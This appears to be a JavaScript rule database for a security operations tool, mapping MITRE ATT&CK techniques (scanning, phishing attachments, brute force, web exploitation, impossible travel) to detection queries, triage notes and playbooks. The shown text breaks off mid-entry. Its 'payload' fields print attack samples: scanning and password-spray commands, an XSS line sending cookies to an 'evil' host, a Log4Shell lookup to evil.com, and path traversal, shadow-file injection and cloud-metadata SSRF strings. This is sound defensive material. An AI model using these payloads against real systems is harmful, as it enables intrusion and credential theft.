// ═══════════════════════════════════════════════════════════════════════════
// BLUESHELL - SOC Knowledge Base & Rule Encyclopedia v3.0
// Comprehensive MITRE ATT&CK Enterprise + ICS Rule Engine
// Smart Rule Generator: Type ANY rule name → get full SOC package
// TP/FP Analysis | SOAR Automation | Multi-Platform Queries
// ═══════════════════════════════════════════════════════════════════════════

// ── MITRE ATT&CK Enterprise Tactics ──
const mitreTactics = {
    'TA0043': 'Reconnaissance',
    'TA0042': 'Resource Development',
    'TA0001': 'Initial Access',
    'TA0002': 'Execution',
    'TA0003': 'Persistence',
    'TA0004': 'Privilege Escalation',
    'TA0005': 'Defense Evasion',
    'TA0006': 'Credential Access',
    'TA0007': 'Discovery',
    'TA0008': 'Lateral Movement',
    'TA0009': 'Collection',
    'TA0011': 'Command and Control',
    'TA0010': 'Exfiltration',
    'TA0040': 'Impact'
};

// ── MITRE ATT&CK ICS Tactics ──
const mitreICSTactics = {
    'TA0108': 'Initial Access (ICS)',
    'TA0104': 'Execution (ICS)',
    'TA0110': 'Persistence (ICS)',
    'TA0111': 'Privilege Escalation (ICS)',
    'TA0103': 'Evasion (ICS)',
    'TA0109': 'Lateral Movement (ICS)',
    'TA0100': 'Collection (ICS)',
    'TA0101': 'Command and Control (ICS)',
    'TA0107': 'Discovery (ICS)',
    'TA0106': 'Inhibit Response Function (ICS)',
    'TA0105': 'Impair Process Control (ICS)',
    'TA0102': 'Impact (ICS)'
};

// ── Category metadata for display ──
const categoryMeta = {
    'Reconnaissance':         { icon: '⊙', color: '#8b949e',   tactics: 'TA0043', framework: 'Enterprise' },
    'Resource Development':   { icon: '⚒', color: '#8b949e',   tactics: 'TA0042', framework: 'Enterprise' },
    'Initial Access':         { icon: '⚡', color: '#ff3333',   tactics: 'TA0001', framework: 'Enterprise' },
    'Execution':              { icon: '▶',  color: '#ffcc00',   tactics: 'TA0002', framework: 'Enterprise' },
    'Persistence':            { icon: '⟲',  color: '#a855f7',   tactics: 'TA0003', framework: 'Enterprise' },
    'Privilege Escalation':   { icon: '⬆',  color: '#ff3333',   tactics: 'TA0004', framework: 'Enterprise' },
    'Defense Evasion':        { icon: '◌',  color: '#ffcc00',   tactics: 'TA0005', framework: 'Enterprise' },
    'Credential Access':      { icon: '⚿', color: '#ff3333',   tactics: 'TA0006', framework: 'Enterprise' },
    'Discovery':              { icon: '⊕',  color: '#00d4ff',   tactics: 'TA0007', framework: 'Enterprise' },
    'Lateral Movement':       { icon: '↔',  color: '#a855f7',   tactics: 'TA0008', framework: 'Enterprise' },
    'Collection':             { icon: '◫',  color: '#ffcc00',   tactics: 'TA0009', framework: 'Enterprise' },
    'Command and Control':    { icon: '⌂',  color: '#a855f7',   tactics: 'TA0011', framework: 'Enterprise' },
    'Exfiltration':           { icon: '↗',  color: '#ff3333',   tactics: 'TA0010', framework: 'Enterprise' },
    'Impact':                 { icon: '✖',  color: '#ff3333',   tactics: 'TA0040', framework: 'Enterprise' },
    'ICS - Initial Access':           { icon: '⚡', color: '#ff6b35', tactics: 'TA0108', framework: 'ICS' },
    'ICS - Execution':                { icon: '▶',  color: '#ff6b35', tactics: 'TA0104', framework: 'ICS' },
    'ICS - Inhibit Response':         { icon: '⊘',  color: '#ff6b35', tactics: 'TA0106', framework: 'ICS' },
    'ICS - Impair Process Control':   { icon: '⚠',  color: '#ff6b35', tactics: 'TA0105', framework: 'ICS' },
    'ICS - Impact':                   { icon: '✖',  color: '#ff6b35', tactics: 'TA0102', framework: 'ICS' },
    'ICS - Lateral Movement':         { icon: '↔',  color: '#ff6b35', tactics: 'TA0109', framework: 'ICS' },
    'ICS - Discovery':                { icon: '⊕',  color: '#ff6b35', tactics: 'TA0107', framework: 'ICS' },
    'ICS - Collection':               { icon: '◫',  color: '#ff6b35', tactics: 'TA0100', framework: 'ICS' },
    'ICS - Persistence':              { icon: '⟲',  color: '#ff6b35', tactics: 'TA0110', framework: 'ICS' },
    'ICS - Evasion':                  { icon: '◌',  color: '#ff6b35', tactics: 'TA0103', framework: 'ICS' }
};

// ═══════════════════════════════════════════════════════════════════════════
// MASTER RULE DATABASE - Enterprise + ICS
// ═══════════════════════════════════════════════════════════════════════════
const ruleDatabase = [

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// RECONNAISSANCE (TA0043)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{
    id:'RC-001',name:'External Port Scanning / Reconnaissance',category:'Reconnaissance',
    mitre:{tactic:'TA0043',technique:'T1595.001',name:'Active Scanning: Scanning IP Blocks'},
    severity:'Medium',framework:'Enterprise',
    dataSources:['Firewall Logs','IDS/IPS','NetFlow','Cloud VPC Flow Logs'],
    description:'Detects external reconnaissance and port scanning activity targeting your infrastructure. Attackers enumerate open ports and services to identify attack surface before exploitation.',
    queries:{
        splunk:`index=firewall action=blocked OR action=denied
| bucket _time span=5m
| stats count as ScanAttempts, dc(dest_port) as UniquePorts, dc(dest_ip) as UniqueTargets, values(dest_port) as Ports by src_ip, _time
| where UniquePorts >= 20 OR UniqueTargets >= 10
| eval ScanType=case(UniquePorts>100,"Full Port Scan",UniqueTargets>20,"Network Sweep",UniquePorts>20,"Targeted Scan",1=1,"Probe")
| eval Severity=case(UniquePorts>100,"High",UniqueTargets>20,"High",1=1,"Medium")`,
        sentinel:`AzureNetworkAnalytics_CL
| where TimeGenerated > ago(15m)
| where FlowStatus_s == "D"
| summarize ScanAttempts=count(), UniquePorts=dcount(DestPort_d), UniqueTargets=dcount(DestIP_s) by SrcIP_s, bin(TimeGenerated,5m)
| where UniquePorts >= 20 or UniqueTargets >= 10
| extend ScanType = iff(UniquePorts>100,"Full Port Scan","Targeted Scan")`,
        qradar:`SELECT sourceip, COUNT(*) as Attempts, COUNT(DISTINCT destinationport) as UniquePorts, COUNT(DISTINCT destinationip) as UniqueTargets FROM events WHERE category='Firewall Deny' GROUP BY sourceip HAVING UniquePorts >= 20 OR UniqueTargets >= 10 LAST 15 MINUTES`,
        elastic:`event.action: "denied" | Threshold: unique destination.port >= 20 per source.ip in 5m`,
        wazuh:`<rule id="100100" level="8" frequency="20" timeframe="300"><if_sid>2500</if_sid><same_source_ip/><description>Port scanning detected: 20+ connection attempts from same source</description><mitre><id>T1595.001</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=NetworkConnectIP4 | stats dc(RemotePort) as UniquePorts by RemoteAddressIP4 | where UniquePorts >= 20`,
        cortex_xdr:`dataset=xdr_data | filter event_type=NETWORK and action_network=BLOCK | comp count(dst_port) as UniquePorts by src_ip | filter UniquePorts >= 20`,
        sentinelone:`SrcProcName != "" AND NetConnStatus = "FAILED" | Group by SrcIP having count(distinct DstPort) >= 20`
    },
    tpAnalysis:{
        truePositive:['Sequential port scanning (ports 1-1024 in order)','Single source hitting 50+ unique ports in under 5 minutes','Known scanner user-agents (Nmap, Masscan, ZMap)','Scanning from Tor exit nodes or known VPN providers','Scanning followed by exploitation attempts on discovered ports'],
        falsePositive:['Legitimate vulnerability scanners (Qualys, Nessus, Rapid7) from authorized IPs','CDN health checks probing multiple ports','Load balancer health probes','DNS resolution causing multiple connections','Monitoring tools checking service availability'],
        tpIndicators:'High port count (50+) from single IP in short time, sequential port numbers, known scanner signatures, scanning from external/untrusted networks',
        fpIndicators:'Source IP is in authorized scanner list, scanning during approved maintenance window, source is internal monitoring system, consistent with known health-check patterns',
        investigationSteps:'1. Check source IP against threat intel feeds\n2. Verify if source is an authorized scanner\n3. Check if scanning was followed by exploitation attempts\n4. Review what ports/services were discovered\n5. Correlate with any subsequent attacks from same IP'
    },
    soarAutomation:{
        autoActions:['Enrich source IP with threat intelligence (VirusTotal, AbuseIPDB, Shodan)','GeoIP lookup on scanning source','Check if source IP is in authorized scanner whitelist','Create ticket in ITSM if not whitelisted'],
        conditionalActions:['IF source is external AND not whitelisted → Block at firewall for 24h','IF scan targets > 50 hosts → Escalate to Tier 2','IF scanning IP matches known threat actor → Escalate to IR team','IF followed by successful connections → Trigger full investigation'],
        playbookFlow:'1. Auto-enrich IP → 2. Check whitelist → 3. If unknown: temp block + alert → 4. If known malicious: permanent block + hunt'
    },
    playbook:{
        detection:'Firewall deny logs show high volume of blocked connections from a single source IP targeting multiple ports or hosts. Correlate with IDS alerts for scan signatures.',
        containment:'1. Block source IP at perimeter firewall\n2. Add to dynamic blocklist\n3. Enable rate limiting on edge devices\n4. Notify NOC of scanning activity\n5. Check if any services were discovered and are vulnerable',
        eradication:'1. Ensure no exploitation occurred on discovered services\n2. Verify firewall rules block unnecessary ports\n3. Update IDS/IPS signatures for scan patterns\n4. Review attack surface and close unnecessary services',
        recovery:'1. Conduct external vulnerability scan of discovered services\n2. Patch any vulnerable services found\n3. Review and harden firewall rules\n4. Implement geo-blocking if scanning from known bad regions\n5. Set up automated blocking for scan patterns'
    },
    policy:'Perimeter Security Policy: Block all unnecessary inbound ports. Implement rate limiting on edge devices. Deploy IDS/IPS with scan detection signatures. Maintain authorized scanner whitelist. Enable automated blocking for scan patterns. Conduct monthly external attack surface assessment.',
    payload:`# Common scanning tools and patterns:
# Nmap full port scan
nmap -sS -p- -T4 target.com
nmap -sV -sC -O target.com    # Version + script + OS detection

# Masscan (high-speed)
masscan -p1-65535 target.com --rate=10000

# Rustscan
rustscan -a target.com -r 1-65535

# What firewall logs show:
# Hundreds of SYN packets to sequential ports from single IP
# RST responses on closed ports
# Multiple destination IPs hit in rapid succession`,
    useCases:['Detect external port scanning activity','Identify network sweep reconnaissance','Alert on automated vulnerability scanner traffic','Monitor for pre-attack reconnaissance patterns','Detect Shodan/Censys-style internet scanning'],
    references:['MITRE ATT&CK T1595.001','NIST SP 800-94 IDS/IPS Guide','SANS Network Security Monitoring']
},

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
// INITIAL ACCESS (TA0001)
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{
    id:'IA-001',name:'Phishing - Malicious Attachment Delivery',category:'Initial Access',
    mitre:{tactic:'TA0001',technique:'T1566.001',name:'Phishing: Spearphishing Attachment'},
    severity:'High',framework:'Enterprise',
    dataSources:['Email Gateway','Exchange/O365 Logs','Endpoint Telemetry','Sandbox Detonation'],
    description:'Detects delivery of emails containing suspicious file attachments (executables, scripts, disk images, macro-enabled documents) commonly used in phishing campaigns.',
    queries:{
        splunk:`index=email sourcetype=mail
| where attachment_count > 0
| eval suspicious_ext=if(match(attachment_name,"\\.(exe|scr|bat|cmd|ps1|vbs|js|hta|wsf|lnk|iso|img|vhd|vhdx|dll|msi|jar|com|pif)$"),1,0)
| eval double_ext=if(match(attachment_name,"\\.\\w+\\.(exe|scr|bat|cmd|ps1|vbs|js)$"),1,0)
| eval macro_doc=if(match(attachment_name,"\\.(docm|xlsm|pptm|dotm|xltm|ppam|xlam|sldm)$"),1,0)
| where suspicious_ext=1 OR double_ext=1 OR macro_doc=1
| stats count as DeliveryCount, dc(recipient) as TargetCount, values(recipient) as Targets, values(attachment_name) as Attachments by sender_domain
| eval Severity=case(DeliveryCount>10,"Critical",double_ext=1,"High",macro_doc=1,"High",1=1,"Medium")`,
        sentinel:`EmailEvents
| where Timestamp > ago(24h)
| where AttachmentCount > 0
| extend FileExt = extract(@"\\.(\\w+)$",1,FileName)
| where FileExt in~ ("exe","scr","bat","cmd","ps1","vbs","js","hta","wsf","lnk","iso","img","vhd","dll","msi","docm","xlsm","pptm")
| summarize TargetCount=dcount(RecipientEmailAddress), Targets=make_set(RecipientEmailAddress), Files=make_set(FileName) by SenderFromDomain
| where TargetCount >= 1`,
        qradar:`SELECT sourceip, destinationip, QIDNAME(qid) as EventName, UTF8(payload) as EmailPayload FROM events WHERE LOGSOURCETYPENAME(logsourceid)='Microsoft Exchange' AND (UTF8(payload) ILIKE '%.(exe|scr|bat|cmd|ps1|vbs|js|hta|iso|docm|xlsm)%') LAST 24 HOURS`,
        elastic:`file.extension:("exe" or "scr" or "bat" or "ps1" or "vbs" or "js" or "hta" or "lnk" or "iso" or "docm" or "xlsm") and event.category:"email"`,
        wazuh:`<rule id="100201" level="10"><if_sid>3950</if_sid><field name="attachment_ext">\\.exe$|\\.scr$|\\.bat$|\\.ps1$|\\.vbs$|\\.js$|\\.hta$|\\.lnk$|\\.iso$|\\.docm$|\\.xlsm$</field><description>Phishing: Suspicious attachment extension detected</description><mitre><id>T1566.001</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=ProcessRollup2 | where ParentBaseFileName IN ("outlook.exe","thunderbird.exe") AND FileName MATCHES "(*.exe|*.scr|*.bat|*.ps1|*.vbs|*.js|*.hta|*.lnk)"`,
        cortex_xdr:`dataset=xdr_data | filter event_type=FILE AND action_file_name~="\\.(exe|scr|bat|ps1|vbs|js|hta|lnk|iso)$" AND causality_actor_process_image_name="outlook.exe"`,
        sentinelone:`EventType="File Creation" AND SrcProcName="outlook.exe" AND TgtFileName MATCHES "\\.(exe|scr|bat|ps1|vbs|js|hta|lnk|iso)$"`
    },
    tpAnalysis:{
        truePositive:['Attachment detonation in sandbox shows malicious behavior','File hash matches known malware in threat intel feeds','Sender domain is newly registered (<30 days)','Email body contains social engineering urgency keywords','Attachment drops additional payloads on execution','Multiple recipients targeted in same campaign'],
        falsePositive:['IT distributing legitimate software via email','Developer sharing scripts internally with known context','Automated build notifications with attachments','HR sending macro-enabled forms to known recipients','Vendor sending legitimate ISO installer files'],
        tpIndicators:'Unknown sender domain, recently registered domain (<30d), attachment hash matches threat intel, sandbox detonation positive, embedded macros with auto-exec, double extension files',
        fpIndicators:'Sender in internal directory, attachment hash clean on VT, sender domain age >1yr, known IT distribution pattern, part of established business workflow',
        investigationSteps:'1. Check sender domain age and reputation\n2. Submit attachment hash to VirusTotal/sandbox\n3. Verify sender identity with purported organization\n4. Check if recipients clicked/opened\n5. Search for same attachment hash across all mailboxes\n6. Check endpoint telemetry for post-execution activity'
    },
    soarAutomation:{
        autoActions:['Submit attachment hash to VirusTotal API','Query sender domain age via WHOIS','Detonate attachment in sandbox (Any.Run/Joe Sandbox)','Check sender domain against threat intel feeds','Extract and check URLs in email body'],
        conditionalActions:['IF VT score > 5/70 → Quarantine from all mailboxes + block sender domain','IF domain age < 30 days → Hold for analyst review','IF sandbox shows malicious → Auto-quarantine + block domain + isolate endpoints that opened','IF attachment opened → Trigger endpoint isolation playbook','IF multiple recipients → Escalate as phishing campaign'],
        playbookFlow:'1. Extract IOCs → 2. Auto-enrich (VT, WHOIS, sandbox) → 3. Score risk → 4. Auto-quarantine if malicious → 5. Hunt for other recipients → 6. Block IOCs → 7. Report'
    },
    playbook:{
        detection:'Alert triggers when email gateway or SIEM detects inbound email with suspicious attachment extensions. Validate sender reputation, check attachment hash against threat intel feeds.',
        containment:'1. Quarantine the email from all mailboxes immediately\n2. Block sender domain at email gateway\n3. Block malicious URLs/IPs at proxy/firewall\n4. If attachment opened: isolate the endpoint\n5. If credentials entered: force password reset + revoke sessions',
        eradication:'1. Submit attachment to sandbox (VirusTotal, Any.Run)\n2. Extract IOCs: sender IP, domain, file hash, C2\n3. Search SIEM for other recipients who opened\n4. Block all IOCs across security controls\n5. Check for mailbox forwarding rules created by attacker',
        recovery:'1. Re-image affected endpoints if malware confirmed\n2. Reset credentials for compromised accounts + MFA\n3. Monitor affected accounts for 72 hours\n4. Update email filtering rules\n5. Conduct phishing awareness training'
    },
    policy:'Email Security Policy: Block executable attachments at gateway. Implement attachment sandboxing. Require MFA for all accounts. Enable Safe Attachments (Microsoft). Maintain allowlist for legitimate attachment types only.',
    payload:`# Malicious attachment delivery methods:
# Executable disguised as document
Invoice_2024.pdf.exe (double extension)

# Macro-enabled Office document
Financial_Report.xlsm (contains auto-exec macro → PowerShell download cradle)

# Disk image bypassing Mark-of-the-Web
Project_Files.iso (contains .lnk → PowerShell)

# HTML smuggling
Secure_Document.html (drops and auto-runs embedded payload)

# Password-protected archive
Documents.zip (password: 2024) → contains malware.exe`,
    useCases:['Detect mass phishing campaigns','Identify spearphishing with weaponized attachments','Catch double-extension social engineering','Monitor disk image delivery (ISO/IMG) bypassing MotW','Alert on macro-enabled document delivery','Detect HTML smuggling attacks'],
    references:['MITRE ATT&CK T1566.001','NIST SP 800-177','CISA Phishing Guidance']
},
{
    id:'IA-002',name:'Brute Force / Password Spray Attack',category:'Initial Access',
    mitre:{tactic:'TA0001',technique:'T1110',name:'Brute Force'},
    severity:'High',framework:'Enterprise',
    dataSources:['Windows Security Logs (4625)','Azure AD Sign-in Logs','VPN Logs','Web App Logs','Linux Auth Logs'],
    description:'Detects multiple failed authentication attempts indicating brute force, password spraying, or credential stuffing attacks against any authentication endpoint.',
    queries:{
        splunk:`index=wineventlog EventCode=4625
| bucket _time span=10m
| stats count as FailedAttempts, dc(TargetUserName) as TargetAccounts, values(TargetUserName) as Targets, latest(LogonType) as LogonType by src_ip, _time
| where FailedAttempts >= 10
| eval AttackType=case(TargetAccounts>5,"Password Spray",TargetAccounts=1,"Brute Force",1=1,"Credential Stuffing")
| eval Severity=case(FailedAttempts>50,"Critical",FailedAttempts>20,"High",1=1,"Medium")
| append [search index=wineventlog EventCode=4624 | where src_ip IN (prev_blocked_ips) | eval Alert="Successful Login After Brute Force"]`,
        sentinel:`SigninLogs
| where TimeGenerated > ago(1h)
| where ResultType != 0
| summarize FailedAttempts=count(), TargetAccounts=dcount(UserPrincipalName), Targets=make_set(UserPrincipalName), Locations=make_set(LocationDetails) by IPAddress, bin(TimeGenerated,10m)
| where FailedAttempts >= 10
| extend AttackType = iff(TargetAccounts>5,"Password Spray","Brute Force")`,
        qradar:`SELECT sourceip, COUNT(*) as FailedAttempts, COUNT(DISTINCT username) as TargetAccounts FROM events WHERE QIDNAME(qid)='Failed Login' GROUP BY sourceip HAVING FailedAttempts >= 10 LAST 1 HOURS`,
        elastic:`event.code:"4625" and event.outcome:"failure" | Threshold: count >= 10 per source.ip in 10m`,
        wazuh:`<rule id="100210" level="12" frequency="10" timeframe="300"><if_matched_sid>18106</if_matched_sid><same_source_ip/><description>Brute force attack: 10+ failed logins from same IP</description><mitre><id>T1110</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=UserLogonFailed2 | stats count by RemoteAddressIP4 | where count >= 10`,
        cortex_xdr:`dataset=xdr_data | filter event_type=LOGIN and action_login_status=FAIL | comp count() as Failures by action_remote_ip | filter Failures >= 10`,
        sentinelone:`EventType="Login" AND LoginIsSuccessful="False" | Group by SrcIP having count() >= 10 within 10m`
    },
    tpAnalysis:{
        truePositive:['Sequential failed logins followed by successful login from same IP','Attempts from Tor exit nodes, VPN providers, or known proxies','Password spray: 1-2 attempts per account across hundreds of accounts','Credential stuffing: username:password pairs from known breach dumps','Attempts outside business hours from unusual geolocations','High velocity: 100+ attempts per minute'],
        falsePositive:['Service accounts with expired/rotated passwords causing automated retries','Users with CAPS lock or wrong keyboard layout','VPN reconnection storms during network instability','Monitoring tools with stale credentials','Account lockout testing during security audits','Password policy changes causing mass re-authentication'],
        tpIndicators:'External source IP, high attempt volume (50+/hr), multiple accounts targeted, unusual geolocation, success after failures, Tor/proxy source',
        fpIndicators:'Internal monitoring IP, consistent daily pattern, single account affected, known service account, coincides with password rotation schedule',
        investigationSteps:'1. Check if any accounts were successfully compromised (4624 after 4625)\n2. GeoIP lookup on source\n3. Check source against threat intel\n4. Verify if targeting pattern matches spray vs brute force\n5. Check if targeted accounts are high-value\n6. Look for lateral movement from any compromised account'
    },
    soarAutomation:{
        autoActions:['Enrich source IP (GeoIP, threat intel, ASN lookup)','Check if source IP is known VPN/Tor/proxy','Query last successful login for targeted accounts','Check if any account was locked out'],
        conditionalActions:['IF source is external AND attempts > 20 → Auto-block at firewall for 24h','IF any account successfully logged in after failures → Trigger compromise investigation','IF targeting > 10 accounts (spray) → Escalate to Tier 2 + force MFA challenge','IF source is Tor/proxy → Permanent block + add to watchlist','IF targeting service accounts → Alert identity team'],
        playbookFlow:'1. Detect threshold breach → 2. Enrich source → 3. Check for success after failure → 4. Auto-block if external → 5. If compromised: isolate + reset → 6. Report'
    },
    playbook:{
        detection:'Alert fires when threshold of failed authentications is exceeded. Correlate with GeoIP data for impossible travel. Key: look for successful login AFTER failed attempts (compromised account).',
        containment:'1. Block source IP at perimeter firewall\n2. Lock targeted accounts temporarily\n3. Check for successful logins from attacking IP\n4. Enable account lockout policy\n5. Add source IP to threat intel watchlist',
        eradication:'1. If compromised: force password reset + revoke tokens\n2. Review and strengthen password policy\n3. Check for lateral movement\n4. Block entire IP range if known malicious infra',
        recovery:'1. Unlock accounts after password reset\n2. Enable MFA for all targeted accounts\n3. Implement progressive account lockout\n4. Deploy CAPTCHA on web login\n5. Review remote access configurations'
    },
    policy:'Authentication Policy: Enforce lockout after 5 failed attempts (30min lockout). Require MFA for all remote access. Implement progressive delays. Use CAPTCHA after 3 failures on web apps. Block known bad IPs via threat intel.',
    payload:`# Brute force tools:
hydra -l admin -P rockyou.txt ssh://target
crackmapexec smb target -u users.txt -p 'Summer2024!'
medusa -h target -U users.txt -P passwords.txt -M ssh

# Password spray:
spray.sh -smb target.com users.txt 'Winter2024!'
Invoke-DomainPasswordSpray -Password 'Company2024!'

# Credential stuffing:
# Uses leaked combo lists (user:pass) from previous breaches`,
    useCases:['Detect brute force against RDP/SSH/VPN','Identify password spraying across AD','Monitor web apps for credential stuffing','Alert on distributed brute force from multiple IPs','Correlate failed+successful logins (compromise detection)'],
    references:['MITRE ATT&CK T1110','NIST SP 800-63B','CIS Control 6']
},
{
    id:'IA-003',name:'Exploitation of Public-Facing Application',category:'Initial Access',
    mitre:{tactic:'TA0001',technique:'T1190',name:'Exploit Public-Facing Application'},
    severity:'Critical',framework:'Enterprise',
    dataSources:['WAF Logs','Web Server Logs','IDS/IPS','Application Logs'],
    description:'Detects web exploitation attempts: SQL injection, XSS, command injection, path traversal, SSRF, Log4Shell, and other OWASP Top 10 attacks against internet-facing applications.',
    queries:{
        splunk:`index=web sourcetype=access_combined
| eval attack=case(
    match(uri,"(?i)(union\\s+select|or\\s+1=1|'\\s*or\\s*'|--\\s*$)"),"SQL Injection",
    match(uri,"(?i)(<script|javascript:|onerror=|onload=)"),"XSS",
    match(uri,"(?i)(\\.\\.[\\\\/]|/etc/passwd|/proc/self)"),"Path Traversal",
    match(uri,"(?i)(cmd=|exec=|system\\(|passthru)"),"Command Injection",
    match(uri,"(?i)(\\$\\{jndi:|log4j)"),"Log4Shell",
    match(uri,"(?i)(169\\.254\\.169\\.254|metadata)"),"SSRF",
    1=1,null())
| where isnotnull(attack)
| stats count by src_ip, attack, uri, status
| eval Success=if(status<400,"POSSIBLE EXPLOIT SUCCESS","Blocked")`,
        sentinel:`W3CIISLog
| where csUriStem matches regex @"(?i)(union\\s+select|<script|\\.\\.[\\\\/]|cmd=|\\$\\{jndi|169\\.254)"
| extend Attack=case(csUriStem matches regex @"(?i)union","SQLi",csUriStem matches regex @"(?i)<script","XSS",csUriStem matches regex @"(?i)\\.\\.\\/","PathTraversal",csUriStem matches regex @"(?i)\\$\\{jndi","Log4Shell",true,"Other")
| summarize Attempts=count() by cIP, Attack, scStatus`,
        qradar:`SELECT sourceip, COUNT(*) as Attempts FROM events WHERE LOGSOURCETYPENAME(logsourceid) LIKE '%Web%' AND (UTF8(payload) ILIKE '%union select%' OR UTF8(payload) ILIKE '%<script%' OR UTF8(payload) ILIKE '%../%' OR UTF8(payload) ILIKE '%\${jndi%') GROUP BY sourceip HAVING Attempts>=3 LAST 1 HOURS`,
        elastic:`url.path:(*union*select* or *<script* or *../* or *jndi*) and http.response.status_code:[200 TO 599]`,
        wazuh:`<rule id="100220" level="14"><if_sid>31100</if_sid><url>union select|../|<script|\\$\\{jndi</url><description>Web exploitation attempt detected</description><mitre><id>T1190</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=HttpRequest | where RequestUrl MATCHES ".*(union select|<script|\\.\\.[\\\\/]|jndi).*"`,
        cortex_xdr:`dataset=xdr_data | filter event_type=HTTP AND (action_url~="union select" OR action_url~="<script" OR action_url~="../" OR action_url~="jndi")`,
        sentinelone:`EventType="URL" AND (URL CONTAINS "union select" OR URL CONTAINS "<script" OR URL CONTAINS "../" OR URL CONTAINS "jndi")`
    },
    tpAnalysis:{
        truePositive:['HTTP 200 response to exploit payload (successful exploitation)','Exploit followed by webshell upload or reverse shell','Known exploit POC payload in request','Subsequent C2 callbacks from web server','Data exfiltration after successful SQLi','Post-exploit reconnaissance commands in logs'],
        falsePositive:['Authorized penetration testing (verify change ticket)','Security scanner (Qualys, Nessus, Burp) from approved IPs','WAF tuning generating test traffic','Search queries containing SQL keywords','Developers testing input validation','Legitimate LDAP queries matching jndi pattern'],
        tpIndicators:'HTTP 200 to exploit payload, unknown source IP, exploit followed by post-exploitation activity, known exploit CVE pattern, webshell file creation after exploit',
        fpIndicators:'Source IP is authorized scanner, attack blocked (403/WAF), authorized pentest window, no post-exploitation activity',
        investigationSteps:'1. Check HTTP response code (200=possible success)\n2. Verify if authorized pentest in progress\n3. Check for webshell creation on server\n4. Look for post-exploitation activity\n5. Check if data was exfiltrated via SQLi\n6. Review application logs for anomalies'
    },
    soarAutomation:{
        autoActions:['Block attacking IP at WAF/firewall','Check source IP against threat intel','Scan web server for webshells','Alert application security team','Check if vulnerability is in CISA KEV'],
        conditionalActions:['IF HTTP 200 to exploit → Emergency: take app offline + forensics','IF known CVE exploit → Check patch status immediately','IF webshell detected → Isolate server + IR activation','IF SQLi successful → Database forensics + breach notification prep'],
        playbookFlow:'1. Detect exploit attempt → 2. Block IP → 3. Check response code → 4. If successful: isolate + forensics → 5. Patch + restore → 6. Post-incident review'
    },
    playbook:{
        detection:'WAF/SIEM detects exploitation patterns. CRITICAL: Check response codes - 200/301 may indicate successful exploitation.',
        containment:'1. Block attacking IP at WAF/firewall\n2. If successful exploit (200): take app offline\n3. Check for webshells in web directories\n4. Review server for post-exploitation activity\n5. Enable enhanced WAF rules',
        eradication:'1. Identify and patch the vulnerability\n2. Search for webshells/backdoors\n3. Review database for injected data\n4. Audit files against known-good baseline\n5. Check for privilege escalation',
        recovery:'1. Deploy patched application\n2. Restore modified files from clean backup\n3. Rotate all application credentials/API keys\n4. Implement WAF virtual patching\n5. Conduct full security assessment'
    },
    policy:'Web Application Security: WAF in blocking mode for all public apps. Quarterly vuln assessments. Annual pentests. OWASP Secure Coding. Patch SLA: Critical=24h, High=72h.',
    payload:`# SQL Injection: ' UNION SELECT username,password FROM users--
# XSS: <script>document.location='http://evil/steal?c='+document.cookie</script>
# Path Traversal: ../../../etc/passwd
# Command Injection: ;cat /etc/shadow
# Log4Shell: \${jndi:ldap://evil.com/exploit}
# SSRF: http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
    useCases:['Detect SQLi/XSS/RCE attempts','Monitor for Log4Shell exploitation','Identify automated vulnerability scanning','Alert on successful exploitation (200 response)','Detect webshell upload post-exploitation','Monitor for SSRF attacks'],
    references:['MITRE ATT&CK T1190','OWASP Top 10 2021','CISA KEV Catalog']
},
{
    id:'IA-004',name:'Valid Account Compromise / Impossible Travel',category:'Initial Access',
    mitre:{tactic:'TA0001',technique:'T1078',name:'Valid Accounts'},
    severity:'High',framework:'Enterprise',
    dataSources:['Azure AD Sign-in Logs','VPN Logs','Cloud Access Logs','MFA Logs'],
    description:'Detects use of compromised valid credentials including impossible travel (logins from geographically distant locations in impossible time), suspicious MFA behavior, and anomalous access patterns.',
    queries:{
        splunk:`index=azure_ad sourcetype=azure:aad:signin Status.errorCode=0
| iplocation src_ip
| sort 0 UserPrincipalName, _time
| autoregress City, Country, _time p=1
| eval distance=if(City!=City_p1 AND Country!=Country_p1, "Different Location", "Same Location")
| eval timedelta=_time - _time_p1
| where distance="Different Location" AND timedelta < 7200
| eval Severity="High"
| eval Alert="Impossible Travel: " + City_p1 + " → " + City + " in " + tostring(timedelta/60,"%.0f") + " minutes"`,
        sentinel:`SigninLogs
| where ResultType == 0
| extend City = LocationDetails.city, Country = LocationDetails.countryOrRegion
| order by UserPrincipalName, TimeGenerated asc
| serialize | extend PrevCity = prev(City), PrevCountry = prev(Country), PrevTime = prev(TimeGenerated), PrevUser = prev(UserPrincipalName)
| where UserPrincipalName == PrevUser and City != PrevCity and Country != PrevCountry
| extend TimeDiffMinutes = datetime_diff('minute', TimeGenerated, PrevTime)
| where TimeDiffMinutes < 120`,
        qradar:`SELECT username, sourceip, COUNT(DISTINCT GEODATA(sourceip,'country')) as UniqueCountries FROM events WHERE QIDNAME(qid)='Login Success' GROUP BY username HAVING UniqueCountries >= 2 LAST 2 HOURS`,
        elastic:`event.outcome:"success" and event.category:"authentication" | Alert when same user authenticates from 2+ countries within 2 hours`,
        wazuh:`<rule id="100230" level="12"><if_sid>18100</if_sid><description>Impossible travel: Login from different country within 2 hours</description><mitre><id>T1078</id></mitre></rule>`,
        crowdstrike:`Event_SimpleName=UserLogon | stats dc(RemoteAddressCountry) as Countries by UserName | where Countries >= 2`,
        cortex_xdr:`dataset=xdr_data | filter event_type=LOGIN and action_login_status=SUCCESS | comp count_distinct(action_country) as Countries by action_username | filter Countries >= 2`,
        sentinelone:`EventType="Login" AND LoginIsSuccessful="True" | Group by User having count(distinct GeoCountry) >= 2 within 2h`
    },
    tpAnalysis:{
        truePositive:['Login from country where company has no operations','Login from known VPN/proxy after normal login from office','MFA fatigue: multiple MFA push notifications followed by approval','Access to sensitive resources immediately after anomalous login','Login timing impossible (e.g., NYC→Tokyo in 30 minutes)','No VPN or travel history for the user'],
